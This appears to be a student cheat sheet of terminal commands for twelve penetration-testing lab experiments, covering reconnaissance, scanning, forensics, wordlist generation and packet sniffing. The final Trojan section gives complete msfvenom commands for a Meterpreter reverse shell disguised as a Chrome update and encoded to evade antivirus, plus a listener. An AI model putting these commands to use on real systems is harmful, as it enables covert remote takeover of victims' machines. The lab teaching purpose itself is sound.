# VAPT CHEAT SHEET — All 12 Experiments
*Just the commands. Copy-paste into terminal.*

---

### EXP 1 — WHOIS

```bash
sudo apt install whois -y
whois google.com
```

---

### EXP 2 — DIG

```bash
sudo apt install dnsutils -y
dig google.com
dig google.com A          # Get IP
dig google.com MX         # Get mail servers
dig google.com NS         # Get name servers
dig google.com TXT        # Get TXT records
```

---

### EXP 3 — theHarvester

```bash
sudo apt install theharvester -y
theHarvester -d google.com -l 100 -b google
```

---

### EXP 4 — Passive Recon (testphp.vulnweb.com)

```bash
whois vulnweb.com
nslookup testphp.vulnweb.com
dig testphp.vulnweb.com A
dig vulnweb.com MX
dig vulnweb.com NS
theHarvester -d vulnweb.com -l 50 -b google
```

---

### EXP 5 — Google Dorking
*(Type these directly into a Google search bar in your browser, not the terminal)*

```text
site:testphp.vulnweb.com
site:testphp.vulnweb.com ext:doc
site:testphp.vulnweb.com ext:sql
site:testphp.vulnweb.com inurl:admin
site:testphp.vulnweb.com intitle:"index of"
```

---

### EXP 6 — NMAP

```bash
sudo apt install nmap -y
ping google.com                # Get IP first
nmap -sn 192.168.1.0/24        # Ping scan (find live hosts)
nmap -sT <target_IP>           # TCP connect scan
sudo nmap -sS <target_IP>      # Stealth SYN scan
sudo nmap -sU <target_IP>      # UDP scan
nmap -sV <target_IP>           # Service version detection
sudo nmap -O <target_IP>       # OS detection
```

---

### EXP 7 — Angry IP Scanner (GUI tool)

1. Open Angry IP Scanner
2. Enter IP range e.g., `192.168.1.1` to `192.168.1.254`
3. Select **ICMP + TCP ports**
4. Add ports: `21, 22, 80, 443`
5. Click **Start**
6. Go to **File > Save > CSV/TXT/XML**

---

### EXP 8 — FTK Imager (GUI tool - Windows)

1. Launch FTK Imager
2. Go to **File > Create Disk Image > Source: Image File > Next**
3. Select format: **E01**
4. Choose output folder, tick **"Verify images after created"**
5. Click **Finish**
6. Check MD5/SHA1 hashes match (source = destination)
7. Check file metadata in left panel tree

---

### EXP 9 — Autopsy (GUI tool)

```bash
sudo autopsy        # launch on Kali
```
1. Click **New Case** > enter name > **Finish**
2. Click **Add Data Source** > Disk Image > select `.E01` file
3. Enable: File Type ID, Keyword Search, Hash Lookup, Web Artifacts, Email Parser, Recent Activity, Timeline
4. Click **Finish** (analysis runs automatically)
5. View: Deleted Files / Web History / Timeline
6. Generate Report > **HTML Report**

---

### EXP 10 — CRUNCH

```bash
sudo apt install crunch -y
crunch 4 4 abcdefghijklmnopqrstuvwxyz -o wordlist.txt     # 4-char lowercase
crunch 6 6 0123456789 -o pins.txt                         # 6-digit PINs
crunch 6 6 -t ABC@@@ -o output.txt                        # Pattern based
crunch 6 8 abc123 -o mixed.txt                            # Min 6 max 8
```

---

### EXP 11 — WIRESHARK

```bash
sudo apt install wireshark -y
wireshark                    # launch
```

**HTTP:**
1. Start capture on `eth0`
2. Go to `http://testphp.vulnweb.com/login.php`
3. Enter fake login, submit
4. Stop capture
5. Filter: `http`
6. Find POST request > HTML Form URL Encoded > see password

**HTTPS:**
1. Start capture
2. Go to any `https` site, enter fake login
3. Stop capture
4. Filter: `tls`
5. See only "Encrypted Application Data" — password hidden

---

### EXP 12 — TROJAN (Metasploit)

```bash
sudo snap install metasploit-framework   # install if needed
msfdb init                               # init database
msfconsole                               # launch metasploit
db_status                                # check DB connected (inside msfconsole)
search platform:windows                  # find windows payloads (inside msfconsole)
```

**Generate payload (run in normal terminal, not msfconsole):**
```bash
ifconfig                                 # note your attacker IP
msfvenom --payload windows/meterpreter/reverse_tcp \
  --arch x86 --format exe \
  LHOST=<attacker_IP> LPORT=4444 > windowsMeterpreter.exe
```

**Disguised payload (embedded in legit exe):**
```bash
msfvenom --payload windows/meterpreter/reverse_tcp \
  --template /home/Downloads/ChromeUpdate.exe \
  --arch x86 --format exe \
  --encoding x86/shikata_ga_nai --iterations 500 \
  LHOST=<attacker_IP> LPORT=4444 > windowsMeterpreter.exe
```

**Set up listener (inside msfconsole):**
```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_IP>
set LPORT 4444
run
```
